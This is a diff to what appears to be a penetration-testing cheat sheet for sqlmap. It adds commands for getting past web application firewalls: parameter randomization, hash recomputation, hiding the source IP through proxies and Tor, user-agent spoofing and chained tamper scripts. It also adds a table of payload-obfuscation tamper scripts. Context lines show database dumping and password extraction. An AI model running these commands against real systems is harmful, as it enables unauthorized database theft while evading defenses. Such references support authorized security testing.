@@ -101,10 +101,6 @@ sqlmap -r req.txt
 sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 
-# Use `--random-agent` and/or `--mobile` to evade detection.
-sqlmap -r req.txt --batch --dump --random-agent
-sqlmap -r req.txt --batch --dump --mobile
-
 # Specifying a PUT request
 sqlmap -u www.target.com --data='id=1' --method PUT
 
@@ -146,11 +142,36 @@ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch --all
 sqlmap -r req.txt --batch --search -C pass -v 3
 
-# Bypass WAF w/ Anti-CSRF token bypass
+# Bypass WAF:
+## Anti-CSRF token bypass
 sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 
-# List all tamper scripts
+# Bypass WAF:
+## Unique Value Bypass
+sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+# Bypass WAF:
+## Calculated Parameter Bypass
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+# Bypass WAF:
+## IP Address Concealing
+sqlmap -r req.txt --proxy="socks4://177.39.187.70:33283"
+sqlmap -r req.txt --proxy-file
+sqlmap -r req.txt --tor # a SOCKS4 proxy service must be installed at the local port 9050 or 9150
+
+# Bypass WAF:
+## User-agent Blacklisting Bypass
+sqlmap -r req.txt --batch --dump --random-agent
+sqlmap -r req.txt --batch --dump --mobile
+
+# Bypass WAF:
+## List all tamper scripts + chain tamper scripts
 sqlmap --list-tampers
+sqlmap -r req.txt --tamper=between,randomcase
+
+# Skip sqlmap WAF detection to produce less noise
+sqlmap -r req.txt --skip-waf
 
 # Check for DBA Privileges
 sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
@@ -169,6 +190,28 @@ sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
 
 # Debug errors with proxy
 sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6 --proxy
+
+# Tamper Scripts:
+`0eunion`	Replaces instances of UNION with e0UNION
+`base64encode`	Base64-encodes all characters in a given payload
+`between`	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
+`commalesslimit`	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
+`equaltolike`	Replaces all occurrences of operator equal (=) with LIKE counterpart
+`halfversionedmorekeywords`	Adds (MySQL) versioned comment before each keyword
+`modsecurityversioned`	Embraces complete query with (MySQL) versioned comment
+`modsecurityzeroversioned`	Embraces complete query with (MySQL) zero-versioned comment
+`percentage`	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
+`plus2concat`	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
+`randomcase`	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+`space2comment`	Replaces space character ( ) with comments `/
+`space2dash`	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
+`space2hash`	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
+`space2mssqlblank`	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
+`space2plus`	Replaces space character ( ) with plus (+)
+`space2randomblank`	Replaces space character ( ) with a random blank character from a valid set of alternate characters
+`symboliclogical`	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+`versionedkeywords`	Encloses each non-function keyword with (MySQL) versioned comment
+`versionedmorekeywords`	Encloses each keyword with (MySQL) versioned comment
 ```
 
 ---
